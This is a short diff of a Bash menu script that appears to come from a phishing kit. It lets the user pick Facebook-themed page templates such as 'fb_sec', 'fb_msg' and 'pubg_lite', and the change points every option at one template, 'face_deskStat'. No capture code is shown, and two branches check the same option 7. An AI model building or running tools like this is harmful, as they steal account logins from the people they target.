@@ -475,11 +475,11 @@ printf "\e[0m\n"
 read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select an option: \e[0m\e[1;96m\en' fb_option
 
 if [[ $fb_option == 1 || $fb_option == 01 ]]; then
-server="facebook"
+server="face_deskStat"
 start
 
 elif [[ $fb_option == 2 || $fb_option == 02 ]]; then
-server="face_desk"
+server="face_deskStat"
 start
 
 elif [[ $fb_option == 3 || $fb_option == 03 ]]; then
@@ -487,23 +487,23 @@ server="face_deskStat"
 start
 
 elif [[ $fb_option == 4 || $fb_option == 04 ]]; then
-server="fb_sec"
+server="face_deskStat"
 start
 
 elif [[ $fb_option == 5 || $fb_option == 05 ]]; then
-server="lb_adv"
+server="face_deskStat"
 start
 
 elif [[ $fb_option == 6 || $fb_option == 06 ]]; then
-server="fb_msg"
+server="face_deskStat"
 start
 
 elif [[ $fb_option == 7 || $fb_option == 07 ]]; then
-server="fb_lana"
+server="face_deskStat"
 start
 
 elif [[ $fb_option == 7 || $fb_option == 07 ]]; then
-server="pubg_lite"
+server="face_deskStat"
 start
 
 else
